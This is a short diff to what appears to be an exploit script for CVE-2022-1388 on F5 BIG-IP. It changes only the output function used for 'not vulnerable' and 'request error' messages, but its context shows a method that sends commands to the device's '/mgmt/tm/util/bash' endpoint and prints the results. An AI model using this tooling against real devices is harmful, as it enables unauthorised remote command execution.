@@ -35,11 +35,11 @@ class Cve_2022_1388:
                 # print(url)
             else:
                 if not self.batch:
-                    OutPrintInfoSuc("BigIP","目标不存在漏洞")
+                    OutPrintInfo("BigIP","目标不存在漏洞")
                 return False
         except Exception:
             if not self.batch:
-                OutPrintInfoSuc("BigIP","目标请求异常")
+                OutPrintInfo("BigIP","目标请求异常")
             return False
     def exploit2(self,target, command):
         url = f'{target}/mgmt/tm/util/bash'
@@ -62,9 +62,9 @@ class Cve_2022_1388:
                 print(r.json()['commandResult'].strip())
                 # print(url)
             else:
-                OutPrintInfoSuc("BigIP","目标不存在漏洞")
+                OutPrintInfo("BigIP","目标不存在漏洞")
         except Exception:
-            OutPrintInfoSuc("BigIP","目标请求异常")
+            OutPrintInfo("BigIP","目标请求异常")
     def main(self,target):
         self.batch = target["batch_work"]
         url = target["url"].strip('/ ')
